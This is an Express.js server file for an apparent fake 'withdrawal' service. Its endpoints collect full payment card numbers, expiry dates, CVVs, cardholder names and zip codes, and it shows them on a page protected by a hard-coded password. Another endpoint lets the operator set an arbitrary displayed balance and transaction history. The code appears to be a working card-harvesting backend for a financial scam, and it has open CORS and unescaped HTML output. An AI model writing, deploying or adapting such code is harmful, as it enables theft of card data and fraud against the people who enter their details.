const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 3000;

// Enable CORS for frontend requests
app.use(cors({
    origin: '*' // Adjust this to your frontend's domain in production
}));

app.use(express.json());
app.use(express.static('public')); // Serve static files from 'public' folder
app.use(express.urlencoded({ extended: true })); // For form submissions

// Store withdrawal data
const withdrawalsFile = path.join(__dirname, 'withdrawals.json');
const PASSWORD = 'ethical19';

// Initialize withdrawals array if file doesn't exist
async function initializeWithdrawals() {
    try {
        await fs.access(withdrawalsFile);
    } catch (error) {
        await fs.writeFile(withdrawalsFile, JSON.stringify([]));
    }
}

// Withdrawal endpoint
app.post('/api/withdraw', async (req, res) => {
    try {
        const withdrawalData = {
            ...req.body,
            timestamp: new Date().toISOString()
        };

        // Read current withdrawals
        const data = await fs.readFile(withdrawalsFile, 'utf8');
        const withdrawals = JSON.parse(data);
        
        // Add new withdrawal
        withdrawals.push(withdrawalData);
        
        // Save updated withdrawals
        await fs.writeFile(withdrawalsFile, JSON.stringify(withdrawals, null, 2));
        
        res.status(200).json({ message: 'Withdrawal recorded successfully' });
    } catch (error) {
        console.error('Error processing withdrawal:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Password prompt page
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Withdrawal Records - Password Required</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    background-color: #f0f2f5;
                }
                .container {
                    text-align: center;
                    background-color: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
                }
                h1 {
                    color: #1564C0;
                    margin-bottom: 20px;
                }
                input[type="password"] {
                    padding: 10px;
                    font-size: 16px;
                    border: 1px solid #ddd;
                    border-radius: 5px;
                    width: 200px;
                    margin-bottom: 20px;
                }
                button {
                    background-color: #1564C0;
                    color: white;
                    padding: 10px 20px;
                    border: none;
                    border-radius: 5px;
                    font-size: 16px;
                    cursor: pointer;
                    transition: background-color 0.3s;
                }
                button:hover {
                    background-color: #0d4a8c;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Enter Password to View Withdrawal Records</h1>
                <form action="/records" method="POST">
                    <input type="password" name="password" placeholder="Enter password" required>
                    <br>
                    <button type="submit">Submit</button>
                </form>
            </div>
        </body>
        </html>
    `);
});

// Display withdrawals page after password verification
app.post('/records', async (req, res) => {
    const { password } = req.body;

    if (password !== PASSWORD) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Access Denied</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        background-color: #f0f2f5;
                    }
                    .container {
                        text-align: center;
                        background-color: white;
                        padding: 40px;
                        border-radius: 10px;
                        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
                    }
                    h1 {
                        color: #d32f2f;
                    }
                    a {
                        color: #1564C0;
                        text-decoration: none;
                    }
                    a:hover {
                        text-decoration: underline;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Access Denied: Incorrect Password</h1>
                    <p><a href="/">Try Again</a></p>
                </div>
            </body>
            </html>
        `);
    }

    try {
        const data = await fs.readFile(withdrawalsFile, 'utf8');
        const withdrawals = JSON.parse(data);

        const html = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>Withdrawal Records</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        margin: 0;
                        padding: 40px;
                        background-color: #f0f2f5;
                    }
                    .container {
                        max-width: 800px;
                        margin: 0 auto;
                    }
                    h1 {
                        color: #1564C0;
                        text-align: center;
                        margin-bottom: 40px;
                    }
                    .record {
                        background-color: white;
                        padding: 20px;
                        margin-bottom: 20px;
                        border-radius: 10px;
                        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
                    }
                    .record p {
                        margin: 10px 0;
                        font-size: 16px;
                        color: #333;
                    }
                    .record p strong {
                        color: #1564C0;
                        display: inline-block;
                        width: 150px;
                    }
                    .delete-btn {
                        background-color: #d32f2f;
                        color: white;
                        padding: 10px 20px;
                        border: none;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 14px;
                        transition: background-color 0.3s;
                    }
                    .delete-btn:hover {
                        background-color: #b71c1c;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Withdrawal Records</h1>
                    ${withdrawals.map((w, index) => `
                        <div class="record">
                            <p><strong>Timestamp:</strong> ${new Date(w.timestamp).toLocaleString()}</p>
                            <p><strong>Amount:</strong> $${w.amount}</p>
                            <p><strong>Card Number:</strong> ${w.cardNumber}</p>
                            <p><strong>Expiration:</strong> ${w.expiringDate}</p>
                            <p><strong>CVV:</strong> ${w.cvv}</p>
                            <p><strong>Cardholder Name:</strong> ${w.cardholdername}</p>
                            <p><strong>Zip Code:</strong> ${w.zipCode}</p>
                            <form action="/delete/${index}" method="POST" style="margin-top: 10px;">
                                <button type="submit" class="delete-btn">Delete</button>
                            </form>
                        </div>
                    `).join('')}
                </div>
            </body>
            </html>
        `;

        res.send(html);
    } catch (error) {
        console.error('Error displaying withdrawals:', error);
        res.status(500).send('Error loading withdrawal records');
    }
});

// Delete a withdrawal record
app.post('/delete/:index', async (req, res) => {
    try {
        const index = parseInt(req.params.index);
        const data = await fs.readFile(withdrawalsFile, 'utf8');
        let withdrawals = JSON.parse(data);

        if (index >= 0 && index < withdrawals.length) {
            withdrawals.splice(index, 1); // Remove the record at the specified index
            await fs.writeFile(withdrawalsFile, JSON.stringify(withdrawals, null, 2));
        }

        res.redirect('/records?password=' + PASSWORD); // Redirect back to records page
    } catch (error) {
        console.error('Error deleting withdrawal:', error);
        res.status(500).send('Error deleting withdrawal record');
    }
});

// Store balance and history
let balance = 678;
let transactionHistory = [
    { type: 'Deposit', amount: 5000, date: '2025-03-01' },
    { type: 'Deposit', amount: 2000, date: '2025-03-05' },
    { type: 'Deposit', amount: 1000, date: '2025-03-10' },
    { type: 'Withdrawal', amount: 6856, date: '2025-03-17' }
];

// Update balance and history endpoint
app.post('/api/update-balance-history', async (req, res) => {
    try {
        const { newBalance, newHistory } = req.body;
        
        if (newBalance !== undefined) {
            balance = parseFloat(newBalance);
        }
        
        if (newHistory && Array.isArray(newHistory)) {
            transactionHistory = newHistory;
        }
        
        res.status(200).json({ 
            message: 'Balance and history updated',
            balance,
            transactionHistory 
        });
    } catch (error) {
        console.error('Error updating balance/history:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Get current balance and history
app.get('/api/balance-history', (req, res) => {
    res.json({ balance, transactionHistory });
});

app.listen(port, async () => {
    await initializeWithdrawals();
    console.log(`Server running on port ${port}`);
});
